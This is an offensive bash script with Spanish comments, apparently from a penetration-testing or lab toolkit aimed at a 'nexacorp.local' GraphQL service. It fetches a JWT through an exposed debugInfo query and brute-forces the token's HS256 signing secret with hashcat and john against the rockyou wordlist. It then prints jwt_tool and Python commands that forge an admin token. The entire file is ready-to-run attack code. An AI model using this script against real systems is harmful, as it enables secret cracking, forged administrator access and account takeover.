#!/usr/bin/env bash
# Crack del JWT HS256 — si funciona, podemos forjar tokens admin
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWT_FILE="${LOOT_DIR}/recon.jwt"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"

# Obtener un JWT fresco vía debugInfo
echo "[*] Obteniendo JWT fresco desde debugInfo..."
FRESH_JWT=$(curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ debugInfo { recon_token } }"}' \
  | jq -r '.data.debugInfo.recon_token')

echo "${FRESH_JWT}" > "${JWT_FILE}"
echo "    JWT: ${FRESH_JWT}"
echo "    Guardado en: ${JWT_FILE}"

# Decodificar payload
echo
echo "[*] Payload decoded:"
echo "${FRESH_JWT}" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Verificar wordlist
if [[ ! -f "${WORDLIST}" ]]; then
  echo "[!] Wordlist no existe: ${WORDLIST}"
  echo "    Descomprime con: gunzip /usr/share/wordlists/rockyou.txt.gz"
  exit 1
fi

echo
echo "[*] Crack con hashcat (modo 16500 = JWT HS256)..."
echo "    Wordlist: ${WORDLIST}"
hashcat -m 16500 "${JWT_FILE}" "${WORDLIST}" --quiet --potfile-disable -O || true

echo
echo "[*] Crack con john (formato HMAC-SHA256)..."
john --format=HMAC-SHA256 --wordlist="${WORDLIST}" "${JWT_FILE}" 2>&1 | tail -5 || true

echo
echo "[*] Si encontró el secret, fórjate un token con jwt_tool:"
echo "    jwt_tool '${FRESH_JWT}' -T -S hs256 -p '<SECRET>'"
echo "    O en Python:"
cat <<'EOF'
    python3 -c "
import jwt, time
secret = 'PASTE_SECRET_HERE'
token = jwt.encode({'sub':'admin','email':'admin@nexacorp.local','role':'admin','iat':int(time.time()),'exp':int(time.time())+3600}, secret, algorithm='HS256')
print(token)
"
EOF
